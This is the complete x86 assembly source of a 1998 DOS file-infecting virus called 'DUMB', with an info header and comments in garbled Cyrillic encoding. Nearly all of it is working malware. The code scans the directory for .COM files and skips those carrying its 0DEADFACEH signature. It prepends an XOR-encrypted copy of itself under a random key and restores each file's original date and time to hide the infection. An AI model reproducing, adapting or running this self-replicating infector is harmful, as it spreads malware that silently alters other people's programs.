   ;       ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
   ;       º  Name:          DUMB  ³ Target:   *.COM  º
   ;       º  Rating:    UnDanger  ³ Stealth:     No  º
   ;       º  Tsr:         No  ³ Phantom:    Yes  º
   ;       º  Arming:      No  ³ Danger(6):    0  º
   ;       º  Attac Speed:        Slow ³ Clock:       No  º
   ;       º  Text Strings:       Yes  ³ Echo:    No  º
   ;       ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
   ;       º  Find Next Target:   SCANNING DIRECTORY      º
   ;       º  AUTHOR:         SERSOFT             º
   ;       º  Other viruses:      BULLET virus (C) 1998   º            º
   ;       ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

           .486
           MODEL   TINY
   DUMB_SEG    SEGMENT PARA PUBLIC USE16 'CODE'
           ASSUME  CS:DUMB_SEG , DS:DUMB_SEG
           ORG 100H
   START:
           PUSH    CS
           POP DS
           PUSH    OFFSET BEGIN_CRYPT
           PUSH    OFFSET DECODE
           RET
   SIGNATURE   DD  0DEADFACEH
   BEGIN_CRYPT:
           MOV CX,[REAL_LEN]   ;‚Ž‘‘’€*Ž‚ˆŒ „‹ˆ**“ ”€‰‹€
           ROR ECX,16

           MOV AH,1AH          ;“‘’€*Ž‚ˆ‹ˆ *Ž‚›‰ DTA
           MOV DX,OFFSET NEW_DTA
           INT 21H

           MOV AX,CS       ;ES - ‘‹…„“ž™ˆ‰ *…*…*…Š*›‚€ž™ˆ‰‘Ÿ
           ADD AX,1000H    ;‘ CS ‘…ƒŒ…*’
           MOV ES,AX

           MOV CX,23H      ;‘Š*›’›‰ , €*•ˆ‚*›‰ , READ ONLY
           MOV AH,4EH
           MOV DX,OFFSET COM_MASK
           INT 21H
           JC  COM_NOT_FOUND
   CONTINUE:
           MOV AX,3D02H
           MOV DX,OFFSET NEW_DTA+1EH   ;€„*…‘ ˆŒ…*ˆ ”€‰‹€ ‚ DTA
           INT 21H
           JC  FIND_NEXT

           MOV BX,AX
           MOV [HANDLE],AX

           MOV AX,5700H    ;*Ž‹“—ˆŒ „€’“
           INT 21H
           JC  FIND_NEXT
           MOV WORD PTR [TIME],CX
           MOV WORD PTR [DATE],DX

           MOV CX,WORD PTR [OFFSET NEW_DTA+1AH] ;„‹ˆ**€ ”€‰‹€
           MOV [REAL_LEN],CX
           ADD CX,VIRUS_LEN
           JC  FIND_NEXT

           MOV [FILE_NEW_LEN],CX

           MOV CX,16
           XOR DX,DX
           MOV AH,3FH

           PUSH    DS
           PUSH    ES
           POP DS

           INT 21H
           POP DS
           JC  FIND_NEXT

           MOV BX,( OFFSET SIGNATURE - 100H )
           MOV EAX,0DEADFACEH
           CMP ES:[BX],EAX
           JE  FIND_NEXT

   ;INFECT THIS .COM FILE

           MOV BX,[FILE_NEW_LEN]
           ADD BX,100H          ;NEW FILE LEN + PSP
           JC  FIND_NEXT        ;‚‘… †… „‹ˆ**…… ‘…ƒŒ…*’€

           XOR BL,BL            ;KEY = RND(0...255)
           NOT BL
           CALL    RANDOMIZE
           MOV BYTE PTR [KEY],BL

           MOV SI,OFFSET START        ;‘„…‹€…Œ ŠŽ*ˆž ‚ˆ*“‘€
           MOV DI,100H
           MOV CX,VIRUS_LEN
           CLD
           REP MOVSB

           PUSH    DS      ;‡€˜ˆ”*“…Œ
           PUSH    ES
           POP DS
           CALL    DECODE

           MOV BX,CS:[HANDLE]
           CALL    LSEEK

           MOV CX,CS:[OFFSET NEW_DTA+1AH]  ;‘—ˆ’€…Œ ”€‰‹
           MOV DX,100H+VIRUS_LEN
           MOV AH,3FH
           INT 21H

           CALL    LSEEK

           MOV DX,100H     ;‡€*ˆ˜…Œ ‡€*€†…**›‰ ”€‰‹
           MOV AH,40H
           MOV CX,CS:[FILE_NEW_LEN]
           INT 21H

           POP DS
           MOV AX,5701H     ;“‘’€*Ž‚ˆŒ ‘’€*Ž… ‚*…ŒŸ
           MOV CX,0000H     ;[TIME]
   TIME        EQU $-2
           MOV DX,0000H     ;[DATE]
   DATE        EQU $-2
           INT 21H

           JMP SHORT FIND_NEXT

   COM_NOT_FOUND:

   ;**Ž—ˆ… „…‰‘’‚ˆŸ

           MOV AH,1AH      ;‚…**…Œ DTA *€ Œ…‘’Ž
           MOV DX,80H
           INT 21H

           MOV WORD PTR [START-2],0A4F3H        ;REP MOVSB

           MOV SI,OFFSET END_OF_DUMB
           MOV DI,100H
           ROR ECX,16     ;‡€’*…Œ ‚ˆ*“‘ ˆ ‡€*“‘’ˆŒ **Žƒ“
           CLD
           PUSH    CS
           POP ES
           XOR AX,AX
           XOR BX,BX
           XOR DX,DX
           JMP START-2
   LSEEK:
           MOV AX,4200H
           XOR CX,CX
           MOV DX,CX
           INT 21H
           RET
   FIND_NEXT:
           MOV BX,[HANDLE]
           MOV AH,3EH
           INT 21H

           MOV AH,4FH
           MOV DX,OFFSET NEW_DTA
           MOV CX,23H
           INT 21H
           JC  COM_NOT_FOUND
           JMP CONTINUE

   RANDOMIZE   PROC
           OR  BL,BL   ; BL= RND (0..BL)  *o«ãç¨âì á«ãç ©ë© ¡ ©â
           JZ  EXRND   ; Ž¡ã«ï¥â DH   ¢ëåo¤¥.
                   ; RND(0..0)=0
           INC BL  ; ¤«ï 0FFh ¥  ¤o +1
           JNZ OKK
           DEC BL
   OKK:
           MOV AX,0100H    ; à §¬¥à ¥¤¨¨ço£o oâà¥§ª 
           DIV BL
           NOT AH

           XCHG    AL,BL
           IN  AL,40H
           CMP AL,AH   ; …á«¨ RND ¡o«ìè¥, ç¥¬ …¤Žâà*‚¥àåƒà ,
           JBE OKK1    ; âo o¡à¥§ ¥¬ ¤o E¤Oâà*‚¥àåƒà 
           MOV AL,AH
   OKK1:
           XOR AH,AH   ; „¥«¨¬ ¯o«ãç¥ë© RND-¡ ©â   …¤¨¨ç.Žâà¥§oª
           DIV BL
           MOV BL,AL
           XOR BH,BH
   EXRND:
           RET
   RANDOMIZE   ENDP
   ;---------------DUMB VIRUS DATA AREA----------------------
   OLD_24H     DD  0
   REAL_LEN    DW  END_PRG - END_OF_DUMB
   HANDLE      DW  0
   FILE_NEW_LEN    DW  0
   NEW_DTA     DB  30H DUP (?)
   COM_MASK    DB  '*.COM',0
   VIRUS       DB  'DUMB tiny virus (C) 1998 <Nsk> by SERSOFT'
   LEN_CRYPT   EQU $-BEGIN_CRYPT
   ;---------------------------------------------------------
   DECODE:
           MOV BX,OFFSET BEGIN_CRYPT
           MOV CX,LEN_CRYPT
           MOV AL,0AAH
   KEY     EQU $-1
   CRYPTING:   XOR DS:[BX],AL

           NEG AL
           ROL AL,1
           SUB AL,65

           INC BX
           DEC CX
           JNE CRYPTING
           RET

   END_OF_DUMB EQU $
   VIRUS_LEN   EQU OFFSET END_OF_DUMB-100H

   ;---------------INFECT PROGRAM AREA-----------------------
           PUSH   CS
           POP    DS
           MOV    DX, 100H + OFFSET DUMB_RUN-OFFSET END_OF_DUMB
           MOV    AH,9
           INT    21H
           RET
   DUMB_RUN    DB     13,10,'-=DUMB IS RUNNING=-',13,10,'$'
   END_PRG     EQU    $

   DUMB_SEG    ENDS
                   END     START
